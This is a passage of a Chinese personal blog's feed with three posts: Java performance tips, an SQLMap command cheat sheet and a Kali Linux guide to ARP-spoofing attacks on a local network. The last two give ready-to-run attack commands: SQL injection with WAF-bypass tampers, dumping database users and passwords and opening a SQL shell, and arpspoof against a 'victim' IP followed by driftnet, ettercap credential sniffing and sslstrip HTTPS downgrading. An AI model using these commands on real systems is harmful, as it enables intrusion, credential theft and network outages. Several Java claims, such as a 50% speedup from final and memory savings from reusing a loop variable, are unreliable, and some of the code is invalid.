      &lt;p&gt;刚开始试着想将自己的代码上传至github上的时候真的是个小白，Google上面到处搜到处找资源。后来云里雾里的成功上传后，发现网络上介绍的大致有两种方法，一种方法是通过git命令行，另一种方法是通过下载Github客户端或第三方工具，很多IDE也集成了git的大部分功能。&lt;br&gt;
    
    </summary>
    
      <category term="Git" scheme="https://aunsetre.top/categories/Git/"/>
    
    
      <category term="Git" scheme="https://aunsetre.top/tags/Git/"/>
    
      <category term="Github" scheme="https://aunsetre.top/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>Java 代码性能优化总结</title>
    <link href="https://aunsetre.top/2018/01/29/2018-1-29-Java-%E4%BB%A3%E7%A0%81%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/"/>
    <id>https://aunsetre.top/2018/01/29/2018-1-29-Java-代码性能优化总结/</id>
    <published>2018-01-28T16:00:00.000Z</published>
    <updated>2018-05-22T02:42:49.650Z</updated>
    
    <content type="html"><![CDATA[<p>代 码优化，一个很重要的课题。可能有些人觉得没用，一些细小的地方有什么好修改的，改与不改对于代码的运</p><p>行效率有什么影响呢？这个问题我是这么考虑的，就像 大海里面的鲸鱼一样，它吃一条小虾米有用吗？没用，但</p><p>是，吃的小虾米一多之后，鲸鱼就被喂饱了。代码优化也是一样，如果项目着眼于尽快无BUG上线，那么 此时可</p><p>以抓大放小，代码的细节可以不精打细磨；但是如果有足够的时间开发、维护代码，这时候就必须考虑每个可以优</p><p>化的细节了，一个一个细小的优化点累积起 来，对于代码的运行效率绝对是有提升的。<a id="more"></a></p><p> <strong>代码优化的目标是：</strong></p><p> 1、减小代码的体积</p><p>2、提高代码运行的效率</p><p> 本文的内容有些来自网络，有些来自平时工作和学习，当然这不重要，重要的是这些代码优化的细节是否真真正正地有用。那本文会保持长期更新，只要有遇到值得分享的代码优化细节，就会不定时地更新此文。 </p><p><strong>代码优化细节</strong></p><p> <strong>1、尽量指定类、方法的final修饰符</strong></p><p> 带 有final修饰符的类是不可派生的。在Java核心API中，有许多应用final的例子，例如java.lang.String，整个类</p><p>都是 final的。为类指定final修饰符可以让类不可以被继承，为方法指定final修饰符可以让方法不可以被重写。如</p><p>果指定了一个类为final，则该 类所有的方法都是final的。Java编译器会寻找机会内联所有的final方法，内联对于</p><p>提升Java运行效率作用重大，具体参见Java运行期优 化。此举能够使性能平均提高50%。</p><p> <strong>2、尽量重用对象</strong></p><p> 特别是String对象的使用，出现字符串连接时应该使用StringBuilder/StringBuffer代替。由于Java虚拟机不仅要花</p><p>时间生成对象，以后可能还需要花时间对这些对象进行垃圾回收和处理，因此，生成过多的对象将会给程序的性能</p><p>带来很大的影响。</p><p> <strong>3、尽可能使用局部变量</strong></p><p> 调用方法时传递的参数以及在调用中创建的临时变量都保存在栈中速度较快，其他变量，如静态变量、实例变量</p><p>等，都在堆中创建，速度较慢。另外，栈中创建的变量，随着方法的运行结束，这些内容就没了，不需要额外的垃</p><p>圾回收。</p><p> <strong>4、及时关闭流</strong></p><p> Java编程过程中，进行数据库连接、I/O流操作时务必小心，在使用完毕后，及时关闭以释放资源。因为对这些大</p><p>对象的操作会造成系统大的开销，稍有不慎，将会导致严重的后果。</p><p> <strong>5、尽量减少对变量的重复计算</strong></p><p> 明确一个概念，对方法的调用，即使方法中只有一句语句，也是有消耗的，包括创建栈帧、调用方法时保护现</p><p>场、调用方法完毕时恢复现场等。所以例如下面的操作：</p><p> for (int i = 0; i &lt; list.size(); i++)</p><blockquote><p>{…}</p></blockquote><p> <strong>建议替换为：</strong></p><p> for (int i = 0, int length = list.size(); i &lt; length; i++)</p><blockquote><p>{…}</p></blockquote><p> 这样，在list.size()很大的时候，就减少了很多的消耗</p><p> <strong>6、尽量采用懒加载的策略，即在需要的时候才创建</strong></p><p> <strong>例如：</strong></p><p> String str = “aaa”;</p><blockquote><p>if (i == 1)</p><p>{</p><p>　　list.add(str);</p><p>}</p></blockquote><p> <strong>建议替换为：</strong></p><p> if (i == 1)</p><blockquote><p>{</p><p>　　String str = “aaa”;</p><p>　　list.add(str);</p><p>}</p></blockquote><p> <strong>7、慎用异常</strong></p><p> 异 常对性能不利。抛出异常首先要创建一个新的对象，Throwable接口的构造函数调用名为fillInStackTrace()的本</p><p>地同步方 法，fillInStackTrace()方法检查堆栈，收集调用跟踪信息。只要有异常被抛出，Java虚拟机就必须调整调</p><p>用堆栈，因为在处理过程中创建 了一个新的对象。异常只能用于错误处理，不应该用来控制程序流程。</p><p> <strong>8、不要在循环中使用try…catch…，应该把其放在最外层</strong></p><p>根据网友们提出的意见，这一点我认为值得商榷</p><p> <strong>9、如果能估计到待添加的内容长度，为底层以数组方式实现的集合、工具类指定初始长度</strong></p><p> 比如ArrayList、LinkedLlist、StringBuilder、StringBuffer、HashMap、</p><p> <strong>HashSet等等，以StringBuilder为例：</strong></p><p> （1）StringBuilder()　　　　　　// 默认分配16个字符的空间</p><p>（2）StringBuilder(int size)　　// 默认分配size个字符的空间</p><p>（3）StringBuilder(String str)　// 默认分配16个字符+str.length()个字符空间</p><p> 可 以通过类（这里指的不仅仅是上面的StringBuilder）的构造函数来设定它的初始化容量，这样可以明显地提升</p><p>性能。比如 StringBuilder吧，length表示当前的StringBuilder能保持的字符数量。因为当StringBuilder达到最大</p><p>容量的时 候，它会将自身容量增加到当前的2倍再加2，无论何时只要StringBuilder达到它的最大容量，它就不得</p><p>不创建一个新的字符数组然后将旧的字符数 组内容拷贝到新字符数组中—-这是十分耗费性能的一个操作。试想，</p><p>如果能预估到字符数组中大概要存放5000个字符而不指定长度，最接近5000的2 次幂是4096，每次扩容加的2不</p><p>管，那么：</p><p> （1）在4096 的基础上，再申请8194个大小的字符数组，加起来相当于一次申请了12290个大小的字符数组，如果一开始能指定5000个大小的字符数组，就节省了一倍以上的空间</p><p> （2）把原来的4096个字符拷贝到新的的字符数组中去</p><p> 这 样，既浪费内存空间又降低代码运行效率。所以，给底层以数组实现的集合、工具类设置一个合理的初始化容</p><p>量是错不了的，这会带来立竿见影的效果。但是，注 意，像HashMap这种是以数组+链表实现的集合，别把初始</p><p>大小和你估计的大小设置得一样，因为一个table上只连接一个对象的可能性几乎为0。初始 大小建议设置为2的N</p><p>次幂，如果能估计到有2000个元素，设置成new HashMap(128)、new HashMap(256)都可以。</p><p> <strong>10、当复制大量数据时，使用System.arraycopy()命令</strong></p><p> <strong>11、乘法和除法使用移位操作</strong></p><p> <strong>例如：</strong></p><p> for (val = 0; val &lt; 100000; val += 5)</p><blockquote><p>{</p><p>　　a = val * 8;</p><p>　　b = val / 2;</p><p>}</p></blockquote><p> 用移位操作可以极大地提高性能，因为在计算机底层，对位的操作是最方便、最快的，因此建议修改为： </p><p> for (val = 0; val &lt; 100000; val += 5)</p><blockquote><p>{</p><p>　　a = val &lt;&lt; 3;</p><p>　　b = val &gt;&gt; 1;</p><p>}</p></blockquote><p> 移位操作虽然快，但是可能会使代码不太好理解，因此最好加上相应的注释。</p><p> <strong>12、循环内不要不断创建对象引用</strong></p><p> <strong>例如：</strong></p><p> for (int i = 1; i &lt;= count; i++)</p><blockquote><p>{</p><p>​    Object obj = new Object();    </p><p>}</p></blockquote><p> 这种做法会导致内存中有count份Object对象引用存在，count很大的话，就耗费内存了，建议为改为：</p><p> Object obj = null;</p><blockquote><p>for (int i = 0; i &lt;= count; i++)</p><p>{</p><p>​    obj = new Object();</p><p>}</p></blockquote><p> 这样的话，内存中只有一份Object对象引用，每次new Object()的时候，Object对象引用指向不同的Object罢</p><p>了，但是内存中只有一份，这样就大大节省了内存空间了。</p><p> <strong>13、基于效率和类型检查的考虑，应该尽可能使用array，无法确定数组大小时才使用ArrayList</strong></p><p> <strong>14、尽量使用HashMap、ArrayList、StringBuilder，除非线程安全需要，否则不推荐使用Hashtable、</strong></p><p><strong>Vector、StringBuffer，后三者由于使用同步机制而导致了性能开销</strong></p><p> <strong>15、不要将数组声明为public static final</strong></p><p> 因为这毫无意义，这样只是定义了引用为static final，数组的内容还是可以随意改变的，将数组声明为public更是</p><p>一个安全漏洞，这意味着这个数组可以被外部类所改变</p><p> <strong>16、尽量在合适的场合使用单例</strong></p><p> 使用单例可以减轻加载的负担、缩短加载的时间、提高加载的效率，但并不是所有地方都适用于单例，简单来</p><p>说，单例主要适用于以下三个方面：</p><p> （1）控制资源的使用，通过线程同步来控制资源的并发访问</p><p>（2）控制实例的产生，以达到节约资源的目的</p><p>（3）控制数据的共享，在不建立直接关联的条件下，让多个不相关的进程或线程之间实现通信</p><p> <strong>17、尽量避免随意使用静态变量</strong></p><p> 要知道，当某个对象被定义为static的变量所引用，那么gc通常是不会回收这个对象所占有的堆内存的，如：</p><blockquote><p>public class A</p><p>{</p><p>​    private static B b = new B();  </p><p>}</p></blockquote><p>此时静态变量b的生命周期与A类相同，如果A类不被卸载，那么引用B指向的B对象会常驻内存，直到程序终止</p><p><strong>18、及时清除不再需要的会话</strong></p><p> 为 了清除不再活动的会话，许多应用服务器都有默认的会话超时时间，一般为30分钟。当应用服务器需要保存更</p><p>多的会话时，如果内存不足，那么操作系统会把部分 数据转移到磁盘，应用服务器也可能根据MRU（最近最频繁</p><p>使用）算法把部分不活跃的会话转储到磁盘，甚至可能抛出内存不足的异常。如果会话要被转储到磁 盘，那么必</p><p>须要先被序列化，在大规模集群中，对对象进行序列化的代价是很昂贵的。因此，当会话不再需要时，应当及时调</p><p>用HttpSession的 invalidate()方法清除会话。</p><p><strong>19、实现RandomAccess接口的集合比如ArrayList，应当使用最普通的for循环而不是foreach循环来遍历</strong></p><p> 这 是JDK推荐给用户的。JDK API对于RandomAccess接口的解释是：实现RandomAccess接口用来表明其支持快</p><p>速随机访问，此接口的主要目的是允许一般的算法更改 其行为，从而将其应用到随机或连续访问列表时能提供良</p><p>好的性能。实际经验表明，实现RandomAccess接口的类实例，假如是随机访问的，使用普通 for循环效率将高于</p><p>使用foreach循环；反过来，如果是顺序访问的，则使用Iterator会效率更高。可以使用类似如下的代码作判断：</p><blockquote><p>if (list instanceof RandomAccess)</p><p>{</p><p>​    for (int i = 0; i &lt; list.size(); i++){}</p><p>}</p><p>else</p><p>{</p><p>​    Iterator&lt;?&gt; iterator = list.iterable();</p><p>​    while (iterator.hasNext()){iterator.next()}</p><p>}</p></blockquote><p>foreach循环的底层实现原理就是迭代器Iterator，参见Java语法糖1：可变长度参数以及foreach循环原理。所以</p><p>后半句”反过来，如果是顺序访问的，则使用Iterator会效率更高”的意思就是顺序访问的那些类实例，使用foreach</p><p>循环去遍历。</p><p> <strong>20、使用同步代码块替代同步方法</strong></p><p> 这点在多线程模块中的synchronized锁方法块一文中已经讲得很清楚了，除非能确定一整个方法都是需要进行同</p><p>步的，否则尽量使用同步代码块，避免对那些不需要进行同步的代码也进行了同步，影响了代码执行效率。</p><p><strong>21、将常量声明为static final，并以大写命名</strong></p><p> 这样在编译期间就可以把这些内容放入常量池中，避免运行期间计算生成常量的值。另外，将常量的名字以大写</p><p>命名也可以方便区分出常量与变量</p><p> <strong>22、不要创建一些不使用的对象，不要导入一些不使用的类</strong></p><p>这毫无意义，如果代码中出现”The value of the local variable i is not used”、”The import java.util is never </p><p>used”，那么请删除这些无用的内容</p><p> <strong>23、程序运行过程中避免使用反射</strong></p><p> 关 于，请参见反射。反射是Java提供给用户一个很强大的功能，功能强大往往意味着效率不高。不建议在程序运</p><p>行过程中使用尤其是频繁使用反射机制，特别是 Method的invoke方法，如果确实有必要，一种建议性的做法是将</p><p>那些需要通过反射加载的类在项目启动的时候通过反射实例化出一个对象并放入内存 —-用户只关心和对端交互的</p><p>时候获取最快的响应速度，并不关心对端的项目启动花多久时间。</p><p> <strong>24、使用数据库连接池和线程池</strong></p><p> 这两个池都是用于重用对象的，前者可以避免频繁地打开和关闭连接，后者可以避免频繁地创建和销毁线程</p><p> <strong>25、使用带缓冲的输入输出流进行IO操作</strong></p><p> 带缓冲的输入输出流，即BufferedReader、BufferedWriter、BufferedInputStream、</p><p>BufferedOutputStream，这可以极大地提升IO效率</p><p> <strong>26、顺序插入和随机访问比较多的场景使用ArrayList，元素删除和中间插入比较多的场景使用LinkedList</strong></p><p>这个，理解ArrayList和LinkedList的原理就知道了</p><p> <strong>27、不要让public方法中有太多的形参</strong></p><p> public方法即对外提供的方法，如果给这些方法太多形参的话主要有两点坏处：</p><p> 1、违反了面向对象的编程思想，Java讲求一切都是对象，太多的形参，和面向对象的编程思想并不契合</p><p> 2、参数太多势必导致方法调用的出错概率增加</p><p> 至于这个”太多”指的是多少个，3、4个吧。比如我们用JDBC写一个insertStudentInfo方法，有10个学生信息字段</p><p>要插如Student表中，可以把这10个参数封装在一个实体类中，作为insert方法的形参</p><p> <strong>28、字符串变量和字符串常量equals的时候将字符串常量写在前面</strong></p><p> 这是一个比较常见的小技巧了，如果有以下代码：</p><blockquote><p>String str = “123”;</p><p>if (str.equals(“123”))</p><p>{</p><p>​    …</p><p>}</p></blockquote><p> <strong>建议修改为：</strong></p><blockquote><p>String str = “123”;</p><p>if (“123”.equals(str))</p><p>{</p><p>​    …</p><p>}</p></blockquote><p>这么做主要是可以避免空指针异常</p><p> <strong>29、请知道，在java中if (i == 1)和if (1 == i)是没有区别的，但从阅读习惯上讲，建议使用前者</strong></p><p> 平时有人问，”if (i == 1)”和”if (1== i)”有没有区别，这就要从C/C++讲起。</p><p>在C/C++中，”if (i == 1)”判断条件成立，是以0与非0为基准的，0表示false，非0表示true，如果有这么一段代码：</p><p> int i = 2;</p><blockquote><p>if (i == 1)</p><p>{</p><p>​    …</p><p>}</p><p>else</p><p>{</p><p>​    …</p><p>}</p></blockquote><p>C/C++判断”i==1”不成立，所以以0表示，即false。但是如果：</p><blockquote><p>int i = 2;</p><p>if (i = 1)</p><p>{</p><p>​    …</p><p>}</p><p>else</p><p>{</p><p>​    …</p><p>}</p></blockquote><p>万 一程序员一个不小心，把”if (i == 1)”写成”if (i = 1)”，这样就有问题了。在if之内将i赋值为1，if判断里面的内容非0，返回的就是true了，但是明明i为2，比较的值是1，应该返回的 false。这种情况在C/C++的开发中是很可能发生的并且会导致一些难以理解的错误产生，所以，为了避免开发者在if语句中不正确的赋值操作，建议将 if语句写为：</p><blockquote><p>int i = 2;</p><p>if (1 == i)</p><p>{</p><p>​    …</p><p>}</p><p>else</p><p>{</p><p>​    …</p><p>}</p></blockquote><p>这样，即使开发者不小心写成了”1 = i”，C/C++编译器也可以第一时间检查出来，因为我们可以对一个变量赋值i为</p><p>1，但是不能对一个常量赋值1为i。</p><p>但 是，在Java中，C/C++这种”if (i = 1)”的语法是不可能出现的，因为一旦写了这种语法，Java就会编译报错”Type </p><p>mismatch: cannot convert from int to boolean”。但是，尽管Java的”if (i == 1)”和”if (1 == i)”在语义上没有任何</p><p>区别，但是从阅读习惯上讲，建议使用前者会更好些。</p><p><strong>30、不要对数组使用toString()方法</strong></p><p> <strong>看一下对数组使用toString()打印出来的是什么：</strong></p><blockquote><p>public static void main(String[] args)</p><p>{</p><p>​    int[] is = new int[]{1, 2, 3};</p><p>​    System.out.println(is.toString());</p><p>}</p></blockquote><p> <strong>结果是：</strong></p><p> [I@18a992f</p><p> 本 意是想打印出数组内容，却有可能因为数组引用is为空而导致空指针异常。不过虽然对数组toString()没有意</p><p>义，但是对集合toString()是 可以打印出集合里面的内容的，因为集合的父类AbstractCollections<e>重写了</e></p><p>Object的toString()方法。</p><p> <strong>32、不要对超出范围的基本数据类型做向下强制转型</strong></p><p> <strong>这绝不会得到想要的结果：</strong></p><p> public static void main(String[] args)</p><blockquote><p>{</p><p>​    long l = 12345678901234L;</p><p>​    int i = (int)l;</p><p>​    System.out.println(i);</p><p>}</p></blockquote><p> <strong>我们可能期望得到其中的某几位，但是结果却是：</strong></p><blockquote><p><strong>1942892530</strong></p></blockquote><p> 解释一下。Java中long是8个字节64位的，所以12345678901234在计算机中的表示应该是：</p><p>0000 0000 0000 0000 0000 1011 0011 1010 0111 0011 1100 1110 0010 1111 1111 0010</p><p>一个int型数据是4个字节32位的，从低位取出上面这串二进制数据的前32位是：</p><p> 0111 0011 1100 1110 0010 1111 1111 0010</p><p> 这串二进制表示为十进制1942892530，所以就是我们上面的控制台上输出的内容。从这个例子上还能顺便得到两个结论：</p><p> 1、 整型默认的数据类型是int，long l = 12345678901234L，这个数字已经超出了int的范围了，所以最后有一个</p><p>L，表示这是一个long型数。顺便，浮点型的默认类型是 double，所以定义float的时候要写成””float f = 3.5f”</p><p>2、接下来再写一句”int ii = l + i;”会报错，因为long + int是一个long，不能赋值给int</p><p> <strong>33、公用的集合类中不使用的数据一定要及时remove掉</strong></p><p> 如果一个集合类是公用的（也就是说不是方法里面的属性），那么这个集合里面的元素是不会自动释放的，因为</p><p>始终有引用指向它们。所以，如果公用集合里面的某些数据不使用而不去remove掉它们，那么将会造成这个公用</p><p>集合不断增大，使得系统有内存泄露的隐患。</p><p> <strong>34、把一个基本数据类型转为字符串，基本数据类型.toString()是最快的方式、String.valueOf(数据)次之、</strong></p><p><strong>数据+””最慢</strong></p><p>把一个基本数据类型转为一般有三种方式，我有一个Integer型数据i，可以使用i.toString()、String.valueOf(i)、</p><p>i+””三种方式，三种方式的效率如何，看一个测试：</p><blockquote><p>public static void main(String[] args)</p><p>{</p><p>​    int loopTime = 50000;</p><p>​    Integer i = 0;</p><p>​    long startTime = System.currentTimeMillis();</p><p>​    for (int j = 0; j &lt; loopTime; j++)</p><p>​    {</p><p>​        String str = String.valueOf(i);</p><p>​    }    </p><p>​    System.out.println(“String.valueOf()：” + (System.currentTimeMillis() - startTime) + “ms”);</p><p>​    startTime = System.currentTimeMillis();</p><p>​    for (int j = 0; j &lt; loopTime; j++)</p><p>​    {</p><p>​        String str = i.toString();</p><p>​    }    </p><p>​    System.out.println(“Integer.toString()：” + (System.currentTimeMillis() - startTime) + “ms”);</p><p>​    startTime = System.currentTimeMillis();</p><p>​    for (int j = 0; j &lt; loopTime; j++)</p><p>​    {</p><p>​        String str = i + “”;</p><p>​    }    </p><p>​    System.out.println(“i + “”：” + (System.currentTimeMillis() - startTime) + “ms”);</p><p>}</p></blockquote><p><strong>运行结果为：</strong></p><blockquote><p>String.valueOf()：11ms</p><p>Integer.toString()：5ms</p><p>i + “”：25ms</p></blockquote><p>所以以后遇到把一个基本数据类型转为String的时候，优先考虑使用toString()方法。至于为什么，很简单：</p><p>1、String.valueOf()方法底层调用了Integer.toString()方法，但是会在调用前做空判断</p><p>2、Integer.toString()方法就不说了，直接调用了</p><p>3、i + “”底层使用了StringBuilder实现，先用append方法拼接，再用toString()方法获取字符串</p><p>三者对比下来，明显是2最快、1次之、3最慢</p><p><strong>35、使用最有效率的方式去遍历Map</strong></p><p>遍历Map的方式有很多，通常场景下我们需要的是遍历Map中的Key和Value，那么推荐使用的、效率最高的方式是：</p><blockquote><p>public static void main(String[] args)</p><p>{</p><p>​    HashMap&lt;String, String&gt; hm = new HashMap&lt;String, String&gt;();</p><p>​    hm.put(“111”, “222”);</p><p>​        </p><p>​    Set&lt;Map.Entry&lt;String, String&gt;&gt; entrySet = hm.entrySet();</p><p>​    Iterator&lt;Map.Entry&lt;String, String&gt;&gt; iter = entrySet.iterator();</p><p>​    while (iter.hasNext())</p><p>​    {</p><p>​        Map.Entry&lt;String, String&gt; entry = iter.next();</p><p>​        System.out.println(entry.getKey() + “” + entry.getValue());</p><p>​    }</p><p>}</p></blockquote><p> 如果你只是想遍历一下这个Map的key值，那用”Set<string> keySet = hm.keySet();”会比较合适一些</string></p><p> <strong>36、对资源的close()建议分开操作</strong></p><p> 意思是，比如我有这么一段代码：</p><blockquote><p>try</p><p>{</p><p>​    XXX.close();</p><p>​    YYY.close();</p><p>}</p><p>catch (Exception e)</p><p>{</p><p>​    …</p><p>}</p></blockquote><p><strong>建议修改为：</strong></p><blockquote><p>try</p><p>{</p><p>​    XXX.close();</p><p>}</p><p>catch (Exception e)</p><p>{</p><p>​    …</p><p>}</p><p>try</p><p>{</p><p>​    YYY.close();</p><p>}</p><p>catch (Exception e)</p><p>{</p><p>​    …</p><p>}</p></blockquote><p> 虽 然有些麻烦，却能避免资源泄露。我们想，如果没有修改过的代码，万一XXX.close()抛异常了，那么就进入了catch块中 了，YYY.close()不会执行，YYY这块资源就不会回收了，一直占用着，这样的代码一多，是可能引起资源句柄泄露的。而改为下面的写法之后，就保 证了无论如何XXX和YYY都会被close掉</p><p> <strong>后记</strong></p><p>优秀的代码来自每一点点小小的优化，关注每一个细节，不仅仅能提升程序运行效率，同样可以规避许多未知的问题。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;代 码优化，一个很重要的课题。可能有些人觉得没用，一些细小的地方有什么好修改的，改与不改对于代码的运&lt;/p&gt;
&lt;p&gt;行效率有什么影响呢？这个问题我是这么考虑的，就像 大海里面的鲸鱼一样，它吃一条小虾米有用吗？没用，但&lt;/p&gt;
&lt;p&gt;是，吃的小虾米一多之后，鲸鱼就被喂饱了。代码优化也是一样，如果项目着眼于尽快无BUG上线，那么 此时可&lt;/p&gt;
&lt;p&gt;以抓大放小，代码的细节可以不精打细磨；但是如果有足够的时间开发、维护代码，这时候就必须考虑每个可以优&lt;/p&gt;
&lt;p&gt;化的细节了，一个一个细小的优化点累积起 来，对于代码的运行效率绝对是有提升的。
    
    </summary>
    
      <category term="Java" scheme="https://aunsetre.top/categories/Java/"/>
    
    
      <category term="性能优化" scheme="https://aunsetre.top/tags/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>SQLMap常用命令</title>
    <link href="https://aunsetre.top/2017/12/29/2017-9-29-SQLMap%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>https://aunsetre.top/2017/12/29/2017-9-29-SQLMap常用命令/</id>
    <published>2017-12-28T16:00:00.000Z</published>
    <updated>2018-06-11T03:56:36.317Z</updated>
    
    <content type="html"><![CDATA[<p>cookie注入：<code>sqlmap.py -u 注入点 --cookie &quot;参数&quot; --tables --level 2</code><br>POST登录框注入：<code>sqlmap.py -r 从文件读取数据 -p 指定的参数 --tables</code></p><p>​                <code>sqlmap.py -u 登录的地址 --forms 自动判断注入</code></p><p>​               <code>sqlmap.py -u 登录的地址 --data &quot;指定参数&quot;</code></p><p>绕过waf防火墙：<code>sqlmap.py -u 注入点 -v 3 --dbs  --batch --tamper</code><a id="more"></a></p><p><code>space2morehash.py,space2hash.py,base64encode.py,charencode.py</code><br><code>-u</code> #注入点</p><p><code>-g</code> 谷歌搜索</p><p><code>-f</code>#指纹判别数据库类型</p><p><code>-b</code> #获取数据库版本信息</p><p><code>-p</code> #指定可测试的参数(?page=1&amp;id=2 -p “page,id”)</p><p><code>-D</code> “” #指定数据库名</p><p><code>-T</code> “” #指定表名</p><p><code>-C</code> “” #指定字段</p><p><code>-s</code> “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：<code>-s “xx.log”</code>　　恢复:<code>-s “xx.log” –resume</code>)</p><p><code>–columns</code>#列出字段</p><p><code>–current-user</code> #获取当前用户名称</p><p><code>–current-db</code> #获取当前数据库名称</p><p><code>–users</code> #列数据库所有用户</p><p><code>–passwords</code> #数据库用户所有密码</p><p><code>–privileges</code> #查看用户权限(–privileges -U root)</p><p><code>-U</code> #指定数据库用户</p><p><code>–dbs</code> #列出所有数据库</p><p><code>–tables -D</code> “” #列出指定数据库中的表</p><p><code>–columns -T “user” -D “mysql”</code> #列出mysql数据库中的user表的所有字段</p><p><code>–dump-all</code> #列出所有数据库所有表</p><p><code>–exclude-sysdbs</code> #只列出用户自己新建的数据库和表</p><p><code>–dump -T “” -D “” -C “”</code> #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname)</p><p><code>–dump -T “” -D “” –start 2 –top 4</code> # 列出指定数据库的表的2-4字段的数据</p><p><code>–dbms</code> #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft </p><p>Access,SQLite,Firebird,Sybase,SAP MaxDB)</p><p><code>–os</code> #指定系统(Linux,Windows)</p><p>-<code>-sql -shell</code>  写shell</p><p><code>--delay</code> 延迟的时间</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;cookie注入：&lt;code&gt;sqlmap.py -u 注入点 --cookie &amp;quot;参数&amp;quot; --tables --level 2&lt;/code&gt;&lt;br&gt;POST登录框注入：&lt;code&gt;sqlmap.py -r 从文件读取数据 -p 指定的参数 --tables&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;​                &lt;code&gt;sqlmap.py -u 登录的地址 --forms 自动判断注入&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;​               &lt;code&gt;sqlmap.py -u 登录的地址 --data &amp;quot;指定参数&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;绕过waf防火墙：&lt;code&gt;sqlmap.py -u 注入点 -v 3 --dbs  --batch --tamper&lt;/code&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="https://aunsetre.top/tags/%E6%B8%97%E9%80%8F/"/>
    
      <category term="SQLMap" scheme="https://aunsetre.top/tags/SQLMap/"/>
    
  </entry>
  
  <entry>
    <title>Kail ARP 断网攻击（局域网内）</title>
    <link href="https://aunsetre.top/2017/12/05/Kail-ARP-%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB%EF%BC%88%E5%B1%80%E5%9F%9F%E7%BD%91%E5%86%85%EF%BC%89/"/>
    <id>https://aunsetre.top/2017/12/05/Kail-ARP-断网攻击（局域网内）/</id>
    <published>2017-12-04T16:00:00.000Z</published>
    <updated>2018-06-11T03:55:31.781Z</updated>
    
    <content type="html"><![CDATA[<p>首先 打开KALI 终端   </p><ul><li>输入指令：ifconfig 查看网卡设备   </li><li>获取受害者电脑IP以及网关（同一局域网，网关相同），可以在Windows中ping 一下 ip看一下是否能ping通，  </li><li>输入指令：<code>arpspoof -i eth0（本机网卡设备名称）-t 192.168.0.114（受害者IP）192.168.0.1（目标网关）</code>  ，按下Enter 攻击开始 <a id="more"></a></li><li>在Windows中打开CMD 输入指令 <code>ping 192.168.0.114 （受害者IP）</code>系统返回：请求超时！，即攻击成功，  </li><li>按下Ctrl +C即可停止攻击  如果不知道局域网下有多少主机存活可以在终端输入指令<code>fping -asg</code></li><li>192.168.0.100/24     查看局域网中存活的主机  </li><li>ps:如果出现arpspoof: couldn’t arp for host ，要把虚拟机设</li><li>置成桥接，或者关闭目标防火墙。 </li></ul><p><code>echo 1 &gt;/proc/sys/net/ipv4/ip_forward</code>   </p><p>用于arp欺骗：  <code>arpspoof -i eth0(网卡) -t 192.168.1.100(目标ip) 192.168.1.1（网关）</code>     </p><p>用于arp欺骗后劫持图片  <code>driftnot -i eth0(网卡)</code></p><p> 劫持http账号密码  <code>ettercap -Tq -i eth0(网卡)</code> </p><p>如果想劫持https的   那就现将https的连接还原为<code>http sslstrip -a -f -k</code>  用这个命令   再与劫持http的命令结合使用 </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先 打开KALI 终端   &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;输入指令：ifconfig 查看网卡设备   &lt;/li&gt;
&lt;li&gt;获取受害者电脑IP以及网关（同一局域网，网关相同），可以在Windows中ping 一下 ip看一下是否能ping通，  &lt;/li&gt;
&lt;li&gt;输入指令：&lt;code&gt;arpspoof -i eth0（本机网卡设备名称）-t 192.168.0.114（受害者IP）192.168.0.1（目标网关）&lt;/code&gt;  ，按下Enter 攻击开始
    
    </summary>
    
      <category term="Linux" scheme="https://aunsetre.top/categories/Linux/"/>
    
    
      <category term="渗透" scheme="https://aunsetre.top/tags/%E6%B8%97%E9%80%8F/"/>
    
      <category term="安全" scheme="https://aunsetre.top/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="Kail" scheme="https://aunsetre.top/tags/Kail/"/>
    
  </entry>
  
</feed>
